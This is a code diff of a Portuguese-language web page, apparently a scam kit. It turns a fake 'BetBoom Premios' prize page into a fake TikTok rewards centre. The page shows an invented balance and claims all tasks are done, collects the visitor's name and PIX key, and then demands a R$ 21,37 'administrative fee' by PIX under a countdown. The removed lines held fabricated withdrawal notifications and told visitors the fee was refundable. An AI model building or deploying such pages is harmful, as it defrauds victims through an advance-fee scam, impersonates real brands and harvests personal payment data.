-      padding: 12px;
+      padding: 10px;
       resize: vertical;
       border: 1px solid var(--line);
-      border-radius: 12px;
-      background: var(--surface-2);
-      color: #e9e9ee;
-      font: 12px/1.45 Arial, Helvetica, sans-serif;
-      outline: none;
+      border-radius: 6px;
+      color: #393c46;
+      font-size: 12px;
+      line-height: 1.4;
     }
 
     .copy-pix {
-      min-height: 44px;
-      border-radius: 11px;
-      background: #24242b;
-      color: #fff;
-      font-size: 13px;
-      font-weight: 800;
-      transition: transform 0.22s ease, box-shadow 0.22s ease, background 0.22s ease;
+      margin-top: 9px;
+      background: #111216;
     }
 
-    .copy-pix:hover {
-      background: #111118;
-      box-shadow: 0 12px 26px rgba(20, 20, 30, 0.16);
+    .copy-pix.copied {
+      background: var(--success);
     }
 
-    .pix-status {
-      min-height: 18px;
-      margin: 0;
-      color: var(--muted);
-      font-size: 12px;
-      font-weight: 700;
-      line-height: 1.45;
+    .modal-screen {
+      position: relative;
+      min-height: calc(100vh - 40px);
+      padding-top: 22px;
     }
 
-    .pix-status.error {
-      color: #c5214f;
-    }
-
-    .pix-status.success {
-      color: #00895e;
-    }
-
-    .section-title {
-      margin: 26px 4px 12px;
-      font-size: 14px;
-      font-weight: 800;
-      color: #f4f4f7;
-    }
-
-    .criteria-list {
-      display: grid;
-      gap: 11px;
-    }
-
-    .criteria-card {
-      min-height: 65px;
-      padding: 15px 16px 12px;
-      border: 1px solid var(--line);
-      border-radius: 14px;
-      background: var(--surface);
-      animation: floatIn 0.42s both;
-      transition: transform 0.22s ease, box-shadow 0.22s ease, border-color 0.22s ease;
-    }
-
-    .criteria-card:nth-child(2) {
-      animation-delay: 0.06s;
-    }
-
-    .criteria-card:nth-child(3) {
-      animation-delay: 0.12s;
-    }
-
-    .criteria-card:hover {
-      border-color: rgba(248, 0, 114, 0.55);
-      box-shadow: 0 16px 34px rgba(0, 0, 0, 0.28);
-      transform: translateY(-2px);
-    }
-
-    .criteria-head {
-      display: flex;
-      align-items: center;
-      justify-content: space-between;
-      gap: 12px;
-      margin-bottom: 10px;
-      font-size: 13px;
-      font-weight: 800;
-      color: #f4f4f7;
-    }
-
-    .criteria-name {
-      min-width: 0;
-      display: flex;
-      align-items: center;
-      gap: 5px;
-    }
-
-    .criteria-name span {
-      white-space: nowrap;
-      overflow: hidden;
-      text-overflow: ellipsis;
-    }
-
-    .criteria-count {
-      flex: 0 0 auto;
-    }
-
-    .progress {
-      height: 8px;
-      overflow: hidden;
-      border-radius: 999px;
-      background: #3a1a2b;
-    }
-
-    .progress-fill {
-      height: 100%;
-      width: var(--value);
-      border-radius: inherit;
-      background: var(--pink);
-    }
-
-    .toast {
+    .modal-card {
       position: fixed;
-      left: 22px;
-      right: 18px;
-      bottom: 22px;
-      z-index: 4;
-      min-height: 58px;
-      padding: 11px 18px 11px 10px;
+      left: 50%;
+      bottom: 0;
+      width: min(100%, 440px);
+      transform: translateX(-50%);
+      border: 0;
+      border-radius: 18px 18px 0 0;
+      background: #fff;
+      box-shadow: 0 -18px 48px rgba(20, 22, 28, 0.18);
+    }
+
+    .modal-title {
+      position: relative;
+      margin: 0;
+      padding: 22px 18px 12px;
+      border-bottom: 1px solid var(--line);
+      text-align: center;
+      font-size: 17px;
+      font-weight: 900;
+    }
+
+    .modal-title::before {
+      content: "";
+      position: absolute;
+      left: 50%;
+      top: 9px;
+      width: 44px;
+      height: 4px;
       border-radius: 999px;
-      background: var(--surface);
-      box-shadow: var(--shadow);
-      display: flex;
-      align-items: center;
-      gap: 12px;
+      background: #d9dbe2;
+      transform: translateX(-50%);
     }
 
-    .avatar {
-      flex: 0 0 auto;
-      width: 40px;
-      height: 40px;
-      border-radius: 50%;
-      object-fit: cover;
-      background: linear-gradient(135deg, #ff006d 0%, #ee2b7c 39%, #ff7a00 100%);
-      box-shadow: 0 0 0 2px rgba(248, 0, 114, 0.35);
-    }
-
-    .toast-text {
-      min-width: 0;
-      font-size: 11px;
-      line-height: 1.25;
-      color: var(--muted);
-    }
-
-    .toast-text strong {
-      color: #f4f4f7;
-      font-size: 13px;
-      font-weight: 800;
-    }
-
-    .toast-text .money {
-      color: var(--green);
-      font-weight: 800;
-    }
-
-    @media (min-width: 430px) {
+    @media (min-width: 720px) {
       body {
-        background: #050507;
+        background: #f2f3f6;
       }
 
       .app {
-        width: 390px;
-        margin: 0 auto;
-        background: var(--bg);
-        box-shadow: 0 0 40px rgba(0, 0, 0, 0.52);
-      }
-
-      .toast {
-        left: 50%;
-        width: 390px;
-        right: auto;
-        transform: translateX(-50%);
-      }
-
-      .toast {
-        width: 336px;
-      }
-    }
-
-    @media (min-width: 760px) {
-      .app {
-        width: min(880px, calc(100vw - 48px));
-        padding: 24px 28px 120px;
-      }
-
-      .balance-card {
-        min-height: 230px;
-      }
-
-      .amount {
-        font-size: 40px;
-      }
-
-      .criteria-list {
-        grid-template-columns: repeat(3, minmax(0, 1fr));
-      }
-
-      .criteria-card {
-        min-height: 88px;
-      }
-
-      .withdraw-screen,
-      .confirm-screen {
-        max-width: 760px;
-        margin: 0 auto;
-        padding: 0;
-      }
-
-      .withdraw-balance {
-        min-height: 112px;
-      }
-
-      .pix-form {
-        grid-template-columns: 1fr 1fr;
-        align-items: end;
-      }
-
-      .pix-form .field-group,
-      .request-withdraw {
-        grid-column: 1 / -1;
-      }
-
-      .confirm-header {
-        margin-top: 0;
-      }
-
-      .step-banner {
-        margin-left: 0;
-        margin-right: 0;
-        border-radius: 10px;
-      }
-
-      .confirm-layout {
-        grid-template-columns: minmax(280px, 0.9fr) minmax(320px, 1fr);
-        align-items: start;
-      }
-
-      .confirm-balance {
-        min-height: 210px;
-        border-radius: 18px;
-      }
-
-      .confirm-balance strong {
-        font-size: 42px;
-      }
-
-      .security-title {
-        margin-top: 0;
-      }
-
-      .toast {
-        width: min(880px, calc(100vw - 48px));
-      }
-
-      .toast {
-        width: 420px;
-      }
-    }
-
-    @media (prefers-reduced-motion: reduce) {
-      *,
-      *::before,
-      *::after {
-        animation-duration: 0.01ms !important;
-        animation-iteration-count: 1 !important;
-        scroll-behavior: auto !important;
-        transition-duration: 0.01ms !important;
+        min-height: 100vh;
+        box-shadow: 0 0 0 1px rgba(20, 22, 28, 0.06);
       }
     }
   </style>
 </head>
 <body>
-  <main class="app" aria-label="Painel Insta Pix">
-    <section class="screen" id="home-screen">
-      <header class="topbar">
-        <div class="brand">
-          <img class="brand-logo" src="https://cdn.brandfetch.io/domain/betboom.ru/fallback/lettermark/theme/dark/h/400/w/400/icon?c=1bfwsmEH20zzEfSNTed" alt="Logo BetBoom">
-          <span>BETBOOM <span class="brand-accent">PREMIOS</span></span>
-        </div>
+  <main class="app" aria-label="Central de recompensas">
+    <section class="screen" id="loading-screen">
+      <header class="brand" aria-label="Central de Recompensas">
+        <img class="brand-mark" src="assets/tiktok-logo.png" alt="TikTok">
       </header>
 
-      <section class="balance-card" aria-label="Saldo disponível">
-        <p class="balance-label">Saldo disponível</p>
-        <h1 class="amount js-balance-amount">R$ 500,00</h1>
-        <div class="weekly">
-          <svg width="13" height="13" viewBox="0 0 24 24" aria-hidden="true">
-            <path d="M4 18V6M4 18h16M7 15l4-5 4 3 5-8" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path>
-          </svg>
-          <span>+R$ 127,50 esta semana</span>
+      <div class="loading-panel">
+        <p class="loading-text" id="loading-text">Conectando ao servidor...</p>
+        <div class="loading-track" aria-hidden="true">
+          <div class="loading-fill" id="loading-fill"></div>
         </div>
-        <button class="withdraw" id="open-withdraw" type="button">
-          <svg width="13" height="13" viewBox="0 0 24 24" aria-hidden="true">
-            <path d="M12 4v10M8 10l4 4 4-4M5 20h14" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path>
-          </svg>
-          <span>Sacar Agora</span>
-        </button>
-      </section>
-
-      <h2 class="section-title">Critérios de Atividade</h2>
-
-      <section class="criteria-list" aria-label="Critérios de Atividade">
-        <article class="criteria-card">
-          <div class="criteria-head">
-            <div class="criteria-name">
-              <svg width="13" height="13" viewBox="0 0 24 24" aria-hidden="true">
-                <circle cx="12" cy="12" r="9" fill="none" stroke="#f80072" stroke-width="2"></circle>
-                <path d="M10 8l6 4-6 4V8z" fill="#f80072"></path>
-              </svg>
-              <span>Valor Apostado Na BetBoom</span>
-            </div>
-            <span class="criteria-count">20R$/20R$</span>
-          </div>
-          <div class="progress" aria-hidden="true">
-            <div class="progress-fill" style="--value: 100%;"></div>
-          </div>
-        </article>
-
-        <article class="criteria-card">
-          <div class="criteria-head">
-            <div class="criteria-name">
-              <svg width="13" height="13" viewBox="0 0 24 24" aria-hidden="true">
-                <circle cx="12" cy="12" r="9" fill="none" stroke="#f80072" stroke-width="2"></circle>
-                <path d="M12 7v6l4 2" fill="none" stroke="#f80072" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path>
-              </svg>
-              <span>Tempo na plataforma</span>
-            </div>
-            <span class="criteria-count">1000/1000</span>
-          </div>
-          <div class="progress" aria-hidden="true">
-            <div class="progress-fill" style="--value: 100%;"></div>
-          </div>
-        </article>
-
-        <article class="criteria-card">
-          <div class="criteria-head">
-            <div class="criteria-name">
-              <svg width="13" height="13" viewBox="0 0 24 24" aria-hidden="true">
-                <path d="M20.5 8.5c0 5-8.5 10-8.5 10s-8.5-5-8.5-10A4.5 4.5 0 0 1 12 6a4.5 4.5 0 0 1 8.5 2.5z" fill="none" stroke="#f80072" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path>
-              </svg>
-              <span>tempo no grupo Do Markola</span>
-            </div>
-            <span class="criteria-count">30 Dias/30dias</span>
-          </div>
-          <div class="progress" aria-hidden="true">
-            <div class="progress-fill" style="--value: 100%;"></div>
-          </div>
-        </article>
-      </section>
-
-      <aside class="toast" aria-label="Saque recente">
-        <img class="avatar" id="toast-avatar" src="https://randomuser.me/api/portraits/men/32.jpg" alt="">
-        <div class="toast-text">
-          <strong id="toast-name">rafael A.</strong> sacou <span class="money" id="toast-amount">R$ 1.890,25</span><br>
-          <span id="toast-time">agora mesmo</span>
-        </div>
-      </aside>
+      </div>
     </section>
 
-    <section class="screen withdraw-screen" id="withdraw-screen" hidden>
+    <section class="screen" id="home-screen" hidden>
+      <header class="brand" aria-label="Central de Recompensas">
+        <img class="brand-mark" src="assets/tiktok-logo.png" alt="TikTok">
+      </header>
+
+      <section class="balance-strip" aria-label="Resumo de saldo">
+        <div>
+          <span>Seu saldo <span aria-hidden="true">P</span></span>
+          <strong class="js-balance-amount">R$ 2.834,72</strong>
+        </div>
+        <button class="withdraw" id="open-withdraw" type="button">Sacar</button>
+      </section>
+
+      <section class="task-card" aria-label="Resumo das atividades">
+        <div>
+          <h1>Parabéns! Você concluiu todas as tarefas</h1>
+          <div class="reward js-balance-amount">R$ 2.834,72</div>
+        </div>
+        <div class="task-art" aria-hidden="true">
+          <span class="task-art-icon">&check;</span>
+        </div>
+      </section>
+
+      <section class="mission-card" style="--i: 1;" aria-label="Entrada concluída">
+        <div class="task-row">
+          <div>
+            <p class="task-title">Entre por 14 dias para ganhar</p>
+            <p class="task-meta">8.414 pontos</p>
+            <p class="task-detail">04 de mai - 17 de mai</p>
+          </div>
+          <span class="pill-done">Concluído</span>
+        </div>
+      </section>
+
+      <section class="progress-card" aria-label="Dias de check-in">
+        <p class="progress-title">Você concluiu todos os dias de check-in.</p>
+        <div class="checkin-grid">
+          <span class="checkin-item"><span class="checkin-mark">&check;</span><small>Dia 01</small></span>
+          <span class="checkin-item"><span class="checkin-mark">&check;</span><small>Dia 02</small></span>
+          <span class="checkin-item"><span class="checkin-mark">&check;</span><small>Dia 03</small></span>
+          <span class="checkin-item"><span class="checkin-mark">&check;</span><small>Dia 04</small></span>
+          <span class="checkin-item"><span class="checkin-mark">&check;</span><small>Dia 05</small></span>
+          <span class="checkin-item"><span class="checkin-mark">&check;</span><small>Dia 06</small></span>
+        </div>
+      </section>
+
+      <section class="mission-card" style="--i: 2;" aria-label="Anúncios concluídos">
+        <div class="task-row">
+          <div>
+            <p class="task-title">Veja anúncios direcionados diariamente para ganhar até</p>
+            <p class="task-meta">2.730 pontos</p>
+            <p class="task-detail">30/30 anúncios assistidos</p>
+          </div>
+          <span class="pill-done">Concluído</span>
+        </div>
+      </section>
+
+      <section class="mission-card" style="--i: 3;" aria-label="Vídeos concluídos">
+        <div class="task-row">
+          <div>
+            <p class="task-title">Assistir vídeos</p>
+            <p class="task-meta">500 pontos</p>
+            <p class="task-detail">Assista por 10 min</p>
+          </div>
+          <span class="pill-done">Concluído</span>
+        </div>
+        <div class="points-line" aria-hidden="true">
+          <span class="point-step"><span class="point-dot">P</span><small>50 pontos</small></span>
+          <span class="point-step"><span class="point-dot">P</span><small>100 pontos</small></span>
+          <span class="point-step"><span class="point-dot">P</span><small>150 pontos</small></span>
+          <span class="point-step"><span class="point-dot">P</span><small>225 pontos</small></span>
+        </div>
+      </section>
+
+      <section class="mission-card" style="--i: 4;" aria-label="Recompensas concluídas">
+        <div class="task-row">
+          <div>
+            <p class="task-title">Resgate suas recompensas e ganhe</p>
+            <p class="task-meta">640 pontos</p>
+            <p class="task-detail">8/8 resgatados</p>
+          </div>
+          <span class="pill-done">Concluído</span>
+        </div>
+      </section>
+
+      <section class="mission-card" style="--i: 5;" aria-label="Pesquisas concluídas">
+        <div class="task-row">
+          <div>
+            <p class="task-title">Faça 60 pesquisas diárias para ganhar até</p>
+            <p class="task-meta">996 pontos</p>
+          </div>
+          <span class="pill-done">Concluído</span>
+        </div>
+      </section>
+    </section>
+
+    <section class="screen modal-screen" id="withdraw-screen" hidden>
       <header class="withdraw-header">
         <button class="back-button" id="back-home" type="button" aria-label="Voltar">
           <svg class="icon" viewBox="0 0 24 24" aria-hidden="true">
             <path d="M15 18 9 12l6-6"></path>
           </svg>
         </button>
-        <span>Saque via PIX</span>
+        <span>Resgatar recompensas</span>
       </header>
 
-      <section class="withdraw-balance" aria-label="Saldo disponível">
-        <span>Saldo disponível</span>
-        <strong class="js-balance-amount">R$ 500,00</strong>
-        <img class="withdraw-logo" src="assets/betboom-logo.png" alt="BetBoom">
+      <section class="balance-card" aria-label="Saldo do pedido">
+        <span>Seu saldo</span>
+        <strong class="js-balance-amount">R$ 2.834,72</strong>
+        <p class="balance-subline">Valor registrado para solicitação de saque</p>
+        <div class="coin" aria-hidden="true">P</div>
       </section>
 
-      <form class="pix-form" novalidate>
+      <section class="data-card" aria-label="Dados do pedido">
+        <h2 class="data-title">Sacar dinheiro</h2>
+        <div class="data-row">
+          <span>Transferência via PIX</span>
+          <strong>Ativa</strong>
+        </div>
+        <div class="data-row">
+          <span>Valor solicitado</span>
+          <strong class="js-balance-amount">R$ 2.834,72</strong>
+        </div>
+      </section>
+
+      <form class="pix-form modal-card" novalidate>
+        <h2 class="modal-title">Vincular PIX</h2>
+
+        <div class="field-control">
+          <label for="withdraw-name">Nome</label>
+          <input class="field" id="withdraw-name" type="text" name="name" placeholder="Digite seu nome completo" autocomplete="name" aria-describedby="name-error">
+          <p class="field-error" id="name-error">Preencha seu nome completo corretamente.</p>
+        </div>
+
         <div class="field-group">
-          <label for="pix-type">Tipo de chave PIX</label>
+          <label for="pix-type">Tipo de Chave PIX</label>
           <div class="select-wrap">
             <select id="pix-type" name="pix-type">
               <option value="cpf">CPF</option>
               <option value="email">E-mail</option>
               <option value="telefone">Telefone</option>
-              <option>Chave aleatória</option>
+              <option value="aleatoria">Chave aleatória</option>
             </select>
           </div>
         </div>
 
         <div class="field-control">
-          <input class="field" id="withdraw-name" type="text" name="name" placeholder="Seu nome completo" autocomplete="name" aria-describedby="name-error">
-          <p class="field-error" id="name-error">Preencha seu nome completo corretamente.</p>
-        </div>
-
-        <div class="field-control">
+          <label for="pix-key">Chave PIX</label>
           <input class="field" id="pix-key" type="text" name="pix-key" placeholder="000.000.000-00" inputmode="numeric" maxlength="14" autocomplete="off" aria-describedby="pix-key-error">
           <p class="field-error" id="pix-key-error">Preencha sua chave PIX corretamente.</p>
         </div>
 
-        <div class="field-group betboom-id-section">
-          <div class="betboom-id-header">
-            <label for="betboom-id">ID DA SUA CONTA BETBOOM</label>
-            <span class="betboom-id-example" aria-hidden="true">
-              ID 00-000000
-              <span class="betboom-id-copy"></span>
-            </span>
-          </div>
-          <input class="field" id="betboom-id" type="text" name="betboom-id" placeholder="00-000000" inputmode="numeric" maxlength="9" autocomplete="off" aria-describedby="betboom-id-error">
-          <p class="field-error" id="betboom-id-error">Preencha o ID da sua conta corretamente.</p>
-        </div>
-
-        <button class="request-withdraw" id="request-withdraw" type="submit" disabled>Solicitar Saque →</button>
+        <button class="request-withdraw" id="request-withdraw" type="submit" disabled>Enviar</button>
       </form>
     </section>
 
@@ -1265,83 +1176,122 @@
           </svg>
         </button>
         <div class="confirm-title">
-          <span>Confirmação de saque</span>
+          <span>Confirmação da solicitação</span>
           <span class="timer" id="payment-timer">Tempo restante: 5:00</span>
         </div>
       </header>
 
-      <div class="step-banner" id="step-banner">você está a 1 passo de fazer seu saque!</div>
-      <p class="protocol">Protocolo: TT-2026-WPWF6C</p>
+      <div class="step-banner" id="step-banner">Você está a 1 passo de finalizar a solicitação</div>
 
-      <div class="confirm-layout">
-        <section class="confirm-balance" aria-label="Saldo disponível aguardando confirmação">
-          <span>Saldo disponível</span>
-          <strong class="js-balance-amount">R$ 500,00</strong>
-          <small>Aguardando confirmação para saque</small>
-        </section>
+      <section class="confirm-balance" aria-label="Resumo do valor solicitado">
+        <span>Valor solicitado</span>
+        <strong class="js-balance-amount">R$ 2.834,72</strong>
+        <small>Aguardando pagamento da taxa administrativa</small>
+      </section>
 
-        <section class="security-block" aria-label="Contribuição de segurança">
-          <h2 class="security-title">Contribuição de segurança</h2>
-          <div class="security-amount">
-            <strong>R$ 21,37</strong>
-            <span class="badge">100% reembolsável</span>
-          </div>
-          <p class="security-copy">
-            Contribuição exigida pela <strong>Equipe Markola.</strong> Devolvida em <strong class="pink">1 minuto.</strong>
+      <section class="security-block" aria-label="Taxa administrativa">
+        <h2 class="security-title">Confirmação de identidade</h2>
+        <div class="security-amount">
+          <strong>R$ 21,37</strong>
+          <span class="badge">Taxa administrativa</span>
+        </div>
+        <p class="security-copy">
+          O pagamento é referente à taxa de verificação, processamento antifraude e criação da transação PIX do pedido. O PIX abaixo cobra somente essa taxa administrativa.
+        </p>
+
+        <details class="fee-question" open>
+          <summary>O que está sendo pago?</summary>
+          <p class="fee-answer">
+            Você está pagando uma taxa administrativa de R$ 21,37 para validar os dados informados, processar a solicitação e gerar o registro de atendimento. Esse pagamento não é uma compra de produto físico e não altera a chave PIX cadastrada.
           </p>
+        </details>
 
-          <details class="fee-question">
-            <summary>Por Que Tenho Que Pagar Essa Taxa?</summary>
-            <p class="fee-answer">
-              Essa taxa serve exclusivamente para manter todo o sistema funcionando com segurança, garantindo que o sorteio aconteça de forma correta, estável e sem problemas técnicos. Ela ajuda nos custos da plataforma, validações e proteção de todos os participantes. 🔒⚙️
-              <br><br>
-              💸 O mais importante: esse valor não é perdido. Ele será reembolsado junto com o valor do saque, ou seja, quando você receber seu prêmio/saque, essa quantia volta para você normalmente.
-            </p>
-          </details>
-
-          <div class="breakdown">
-            <div class="breakdown-row">
-              <span>Validação Reembolsavel</span>
-              <strong>R$ 10,68</strong>
-            </div>
-            <div class="breakdown-row">
-              <span>Seguro antifraude</span>
-              <strong>R$ 10,68</strong>
-            </div>
-            <div class="breakdown-row total">
-              <span>Total (reembolsável)</span>
-              <strong>R$ 21,37</strong>
-            </div>
+        <div class="breakdown">
+          <div class="breakdown-row">
+            <span>Validação cadastral</span>
+            <strong>R$ 7,12</strong>
           </div>
-
-          <div class="pix-action">
-            <button class="generate-pix" id="generate-pix" type="button">
-              <svg class="generate-pix-icon" viewBox="0 0 24 24" aria-hidden="true">
-                <path d="M7 7h10v10H7zM3 3h6v6H3zM15 3h6v6h-6zM3 15h6v6H3zM17 17h4v4h-4z" fill="none" stroke="currentColor" stroke-width="2" stroke-linejoin="round"></path>
-              </svg>
-              <span>Gerar Pix</span>
-            </button>
-            <p class="generate-error" id="generate-error"></p>
-
-            <div class="pix-result" id="pix-result">
-              <p class="pix-result-title">Pix gerado para a contribuição reembolsável</p>
-              <div class="pix-qr-wrap" id="pix-qr-wrap">
-                <img id="pix-qr-image" alt="QR Code PIX">
-              </div>
-              <textarea class="pix-code" id="pix-code" readonly placeholder="O código Pix vai aparecer aqui."></textarea>
-              <button class="copy-pix" id="copy-pix" type="button"><span>Copiar código Pix</span></button>
-              <p class="pix-status" id="pix-status"></p>
-            </div>
+          <div class="breakdown-row">
+            <span>Processamento antifraude</span>
+            <strong>R$ 7,12</strong>
           </div>
-        </section>
-      </div>
+          <div class="breakdown-row">
+            <span>Geração da transação PIX</span>
+            <strong>R$ 7,13</strong>
+          </div>
+          <div class="breakdown-row total">
+            <span>Total da taxa</span>
+            <strong>R$ 21,37</strong>
+          </div>
+        </div>
+
+        <p class="legal-copy" style="margin-top: 12px;">
+          Revise os dados antes de pagar. O pagamento será processado via PIX e o comprovante deve ser guardado para acompanhamento do pedido.
+        </p>
+
+        <div class="pix-action">
+          <button class="generate-pix" id="generate-pix" type="button">
+            <svg class="generate-pix-icon" viewBox="0 0 24 24" aria-hidden="true">
+              <path d="M7 7h10v10H7zM3 3h6v6H3zM15 3h6v6h-6zM3 15h6v6H3zM17 17h4v4h-4z"></path>
+            </svg>
+            <span>Gerar Pix da taxa</span>
+          </button>
+          <p class="generate-error" id="generate-error"></p>
+
+          <div class="pix-result" id="pix-result">
+            <p class="pix-result-title">Pix gerado para pagamento da taxa administrativa</p>
+            <div class="pix-qr-wrap" id="pix-qr-wrap">
+              <img id="pix-qr-image" alt="QR Code PIX">
+            </div>
+            <textarea class="pix-code" id="pix-code" readonly placeholder="O código Pix vai aparecer aqui."></textarea>
+            <button class="copy-pix" id="copy-pix" type="button"><span>Copiar código Pix</span></button>
+            <p class="pix-status" id="pix-status"></p>
+          </div>
+        </div>
+      </section>
+
+      <section class="data-card" aria-label="Dados para processamento">
+        <h2 class="data-title">Dados para processamento</h2>
+        <div class="data-row">
+          <span>Nome</span>
+          <strong id="review-name">-</strong>
+        </div>
+        <div class="data-row">
+          <span>Chave PIX</span>
+          <strong id="review-pix">-</strong>
+        </div>
+        <div class="data-row">
+          <span>Valor solicitado</span>
+          <strong class="js-balance-amount">R$ 2.834,72</strong>
+        </div>
+      </section>
+
+      <section class="process-card" aria-label="Processo">
+        <h2 class="process-title">Processo</h2>
+        <div class="process-row">
+          <span class="process-index">1</span>
+          <p>Pagar taxa administrativa <small>R$ 21,37 para processamento do pedido</small></p>
+        </div>
+        <div class="process-row done">
+          <span class="process-index">&check;</span>
+          <p>Receber confirmação <small>Comprovante e código PIX disponíveis após gerar</small></p>
+        </div>
+        <div class="process-row">
+          <span class="process-index">3</span>
+          <p>Acompanhar solicitação <small>Use seus dados cadastrados para suporte</small></p>
+        </div>
+      </section>
     </section>
   </main>
 
   <script>
+    const loadingScreen = document.querySelector("#loading-screen");
     const homeScreen = document.querySelector("#home-screen");
     const withdrawScreen = document.querySelector("#withdraw-screen");
     const confirmScreen = document.querySelector("#confirm-screen");
+    const screens = [loadingScreen, homeScreen, withdrawScreen, confirmScreen];
+    let activeScreen = loadingScreen;
+    let screenTransitionId = 0;
     const openWithdraw = document.querySelector("#open-withdraw");
     const backHome = document.querySelector("#back-home");
     const backWithdraw = document.querySelector("#back-withdraw");
@@ -1350,10 +1300,8 @@
     const nameInput = document.querySelector("#withdraw-name");
     const pixTypeInput = document.querySelector("#pix-type");
     const pixKeyInput = document.querySelector("#pix-key");
-    const betboomIdInput = document.querySelector("#betboom-id");
     const nameError = document.querySelector("#name-error");
     const pixKeyError = document.querySelector("#pix-key-error");
-    const betboomIdError = document.querySelector("#betboom-id-error");
     const generatePix = document.querySelector("#generate-pix");
     const pixResult = document.querySelector("#pix-result");
     const pixCode = document.querySelector("#pix-code");
@@ -1362,14 +1310,14 @@
     const pixQrImage = document.querySelector("#pix-qr-image");
     const copyPix = document.querySelector("#copy-pix");
     const generateError = document.querySelector("#generate-error");
-    const toast = document.querySelector(".toast");
-    const toastAvatar = document.querySelector("#toast-avatar");
-    const toastName = document.querySelector("#toast-name");
-    const toastAmount = document.querySelector("#toast-amount");
-    const toastTime = document.querySelector("#toast-time");
     const balanceAmounts = document.querySelectorAll(".js-balance-amount");
     const paymentTimer = document.querySelector("#payment-timer");
     const stepBanner = document.querySelector("#step-banner");
+    const reviewName = document.querySelector("#review-name");
+    const reviewPix = document.querySelector("#review-pix");
+    const loadingText = document.querySelector("#loading-text");
+    const loadingFill = document.querySelector("#loading-fill");
+
     const withdrawalData = {
       name: "",
       pixType: "cpf",
@@ -1377,68 +1325,80 @@
       document: "",
       email: "",
       phone: "",
-      betboomId: "",
       checkoutKey: "",
     };
+
     let isGeneratingPix = false;
+    let isSubmittingWithdraw = false;
     let hasGeneratedPix = false;
     let paymentTimerInterval = null;
     let paymentTimeLeft = 300;
-    const touchedWithdrawFields = {
+
+    const touchedFields = {
       name: false,
       pixKey: false,
-      betboomId: false,
     };
-    const withdrawalToasts = [
-      {
-        name: "rafael A.",
-        amount: "R$ 1.890,25",
-        time: "agora mesmo",
-        avatar: "https://randomuser.me/api/portraits/men/32.jpg",
-      },
-      {
-        name: "camila R.",
-        amount: "R$ 742,90",
-        time: "há 1 minuto",
-        avatar: "https://randomuser.me/api/portraits/women/44.jpg",
-      },
-      {
-        name: "lucas M.",
-        amount: "R$ 2.310,00",
-        time: "há 2 minutos",
-        avatar: "https://randomuser.me/api/portraits/men/76.jpg",
-      },
-      {
-        name: "bianca S.",
-        amount: "R$ 965,40",
-        time: "agora mesmo",
-        avatar: "https://randomuser.me/api/portraits/women/68.jpg",
-      },
-      {
-        name: "marcos V.",
-        amount: "R$ 1.427,18",
-        time: "há 3 minutos",
-        avatar: "https://randomuser.me/api/portraits/men/41.jpg",
-      },
-    ];
-    let toastIndex = 0;
 
     function formatMoney(value) {
-      return `R$ ${value.toLocaleString("pt-BR", {
-        minimumFractionDigits: 2,
-        maximumFractionDigits: 2,
-      })}`;
+      return new Intl.NumberFormat("pt-BR", {
+        style: "currency",
+        currency: "BRL",
+      }).format(value);
     }
 
-    function setRandomBalance() {
-      const minBalance = 500;
-      const maxBalance = 3000;
-      const balance = Math.floor(Math.random() * (maxBalance - minBalance + 1)) + minBalance;
-      const formattedBalance = formatMoney(balance);
-
+    function setDisplayedBalance() {
+      const fixedBalance = 2834.72;
       balanceAmounts.forEach((amount) => {
-        amount.textContent = formattedBalance;
+        amount.textContent = formatMoney(fixedBalance);
       });
+    }
+
+    function showScreen(screen) {
+      if (screen === activeScreen) {
+        window.scrollTo({ top: 0, behavior: "smooth" });
+        return;
+      }
+
+      const previousScreen = activeScreen;
+      const transitionId = ++screenTransitionId;
+      activeScreen = screen;
+
+      screen.hidden = false;
+      screen.classList.remove("is-exiting");
+      screen.classList.add("is-entering");
+
+      if (previousScreen) {
+        previousScreen.classList.remove("is-entering");
+        previousScreen.classList.add("is-exiting");
+      }
+
+      window.scrollTo({ top: 0, behavior: "smooth" });
+
+      window.setTimeout(() => {
+        if (transitionId !== screenTransitionId) {
+          return;
+        }
+
+        screens.forEach((item) => {
+          const isActive = item === screen;
+          item.hidden = !isActive;
+          item.classList.toggle("is-entering", isActive);
+          item.classList.remove("is-exiting");
+        });
+
+        window.setTimeout(() => {
+          if (screen === activeScreen) {
+            screen.classList.remove("is-entering");
+          }
+        }, 360);
+      }, 240);
+    }
+
+    function setLoadingMessage(message) {
+      loadingText.textContent = message;
+      loadingFill.style.animation = "none";
+      loadingFill.offsetHeight;
+      loadingFill.style.animation = "";
     }
 
     function formatCountdown(totalSeconds) {
@@ -1467,112 +1427,81 @@
     }
 
     function getFirstName(name) {
-      const firstName = String(name).trim().split(/\s+/)[0] || "";
-      return firstName ? firstName.charAt(0).toUpperCase() + firstName.slice(1) : "";
+      return String(name).trim().split(/\s+/)[0] || "";
     }
 
     function updateStepBanner() {
       const firstName = getFirstName(withdrawalData.name);
       stepBanner.textContent = firstName
-        ? `${firstName}, você está a 1 passo de fazer seu saque!`
-        : "você está a 1 passo de fazer seu saque!";
+        ? `${firstName}, você está a 1 passo de finalizar a solicitação`
+        : "Você está a 1 passo de finalizar a solicitação";
     }
 
-    function setFieldState(input, errorElement, isValid, message, shouldShowError) {
-      const showError = !isValid && shouldShowError;
-      input.classList.toggle("invalid", showError);
-      input.setAttribute("aria-invalid", String(showError));
-      errorElement.textContent = showError ? message : "";
+    function setFieldState(input, error, isValid, message, shouldShow) {
+      input.classList.toggle("is-invalid", shouldShow && !isValid);
+      if (message) {
+        error.textContent = message;
+      }
     }
 
     function getPixKeyValidation() {
       const pixType = pixTypeInput.value;
       const value = pixKeyInput.value.trim();
-      const digits = value.replace(/\D/g, "");
 
       if (pixType === "cpf") {
         return {
-          isValid: digits.length === 11,
-          message: "Preencha um CPF com 11 numeros.",
+          isValid: value.replace(/\D/g, "").length === 11,
+          message: "Digite um CPF com 11 numeros.",
         };
       }
 
       if (pixType === "email") {
         return {
           isValid: /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(value),
-          message: "Preencha um e-mail valido.",
+          message: "Digite um e-mail valido.",
         };
       }
 
       if (pixType === "telefone") {
         return {
-          isValid: digits.length === 10 || digits.length === 11,
-          message: "Preencha um telefone valido.",
+          isValid: value.replace(/\D/g, "").length >= 10,
+          message: "Digite um telefone valido.",
         };
       }
 
       return {
-        isValid: value.length >= 5,
-        message: "Preencha sua chave PIX corretamente.",
+        isValid: value.length >= 12,
+        message: "Digite uma chave aleatória válida.",
       };
     }
 
